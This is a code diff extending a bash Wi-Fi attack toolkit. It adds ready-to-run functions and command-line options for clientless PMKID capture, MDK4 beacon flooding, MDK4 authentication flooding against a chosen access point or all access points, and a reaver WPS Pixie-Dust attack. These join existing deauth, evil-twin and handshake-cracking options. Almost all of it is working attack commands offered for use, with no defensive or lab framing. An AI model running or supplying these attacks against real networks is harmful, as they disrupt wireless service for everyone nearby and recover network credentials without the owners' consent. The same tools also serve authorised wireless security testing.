@@ -284,6 +284,82 @@ crack_handshake() {
     aircrack-ng -w "$wordlist" "$cap_file"
 }
 
+# PMKID Attack (Clientless)
+pmkid_capture() {
+    local interface="$1"
+    local duration="${2:-300}" # Default 5 mins
+    
+    [[ -z "$interface" ]] && interface="$MONITOR_INTERFACE"
+    
+    log_info "Starting PMKID capture on $interface for $duration seconds..."
+    log_warning "No clients needed for this attack!"
+    
+    local output_pcapng="$OUTPUT_DIR/pmkid_$(date +%Y%m%d_%H%M%S).pcapng"
+    
+    # hcxdumptool for PMKID capture
+    # -o: output file
+    # -i: interface
+    # --enable_status=1: show status
+    timeout "$duration" hcxdumptool -o "$output_pcapng" -i "$interface" --enable_status=1
+    
+    if [[ -f "$output_pcapng" ]]; then
+        log_success "Capture complete: $output_pcapng"
+        log_info "Convert to hashcat format using: hcxpcapngtool -o hash.hc22000 $output_pcapng"
+    else
+        log_error "Capture failed or no data collected"
+    fi
+}
+
+# MDK4 Beacon Flooding
+mdk4_beacon_flood() {
+    local interface="$1"
+    local ssid_file="$2"
+    
+    [[ -z "$interface" ]] && interface="$MONITOR_INTERFACE"
+    
+    log_info "Starting MDK4 Beacon Flood on $interface..."
+    if [[ -n "$ssid_file" ]]; then
+        log_info "Using SSIDs from: $ssid_file"
+        mdk4 "$interface" b -f "$ssid_file"
+    else
+        log_info "Generating random SSIDs..."
+        mdk4 "$interface" b
+    fi
+}
+
+# MDK4 Auth Flooding
+mdk4_auth_flood() {
+    local interface="$1"
+    local bssid="$2"
+    
+    [[ -z "$interface" ]] && interface="$MONITOR_INTERFACE"
+    
+    if [[ -n "$bssid" ]]; then
+        log_info "Starting MDK4 Auth Flood against $bssid on $interface..."
+        mdk4 "$interface" a -a "$bssid"
+    else
+        log_info "Starting MDK4 Auth Flood against ALL APs on $interface..."
+        mdk4 "$interface" a
+    fi
+}
+
+# WPS Pixie-Dust Attack
+wps_pixie_dust() {
+    local bssid="$1"
+    local interface="$2"
+    
+    if [[ -z "$bssid" ]]; then
+        log_error "Usage: $0 --pixie <BSSID> [INTERFACE]"
+        exit 1
+    fi
+    
+    [[ -z "$interface" ]] && interface="$MONITOR_INTERFACE"
+    
+    log_info "Starting WPS Pixie-Dust attack against $bssid..."
+    # -i: interface, -b: bssid, -K: pixie-dust, -vv: verbose
+    reaver -i "$interface" -b "$bssid" -K 1 -vv
+}
+
 # Show help
 show_help() {
     cat << EOF
@@ -299,6 +375,10 @@ ${YELLOW}Options:${NC}
   --deauth <BSSID> [COUNT]  Deauth attack (0=continuous)
   --evil-twin <SSID> [CH]   Create Evil Twin AP (uses wifiphisher/fluxion if available)
   --crack <FILE> [DICT]     Crack captured handshake
+  --pmkid [DUR]             Capture PMKID (clientless, default 300s)
+  --beacon [FILE]           MDK4 Beacon Flood (optional SSID list)
+  --auth [BSSID]            MDK4 Auth Flood (optional target BSSID)
+  --pixie <BSSID>           WPS Pixie-Dust attack
   --monitor-on              Enable monitor mode
   --monitor-off             Disable monitor mode
   --help                    Show this help
@@ -340,10 +420,22 @@ main() {
             deauth_attack "$2" "$3"
             ;;
         --evil-twin)
-            evil_twin "$2"
+            evil_twin "$2" "$3"
             ;;
         --crack)
             crack_handshake "$2" "$3"
+            ;;
+        --pmkid)
+            pmkid_capture "$MONITOR_INTERFACE" "$2"
+            ;;
+        --beacon)
+            mdk4_beacon_flood "$MONITOR_INTERFACE" "$2"
+            ;;
+        --auth)
+            mdk4_auth_flood "$MONITOR_INTERFACE" "$2"
+            ;;
+        --pixie)
+            wps_pixie_dust "$2" "$MONITOR_INTERFACE"
             ;;
         --monitor-on)
             enable_monitor_mode
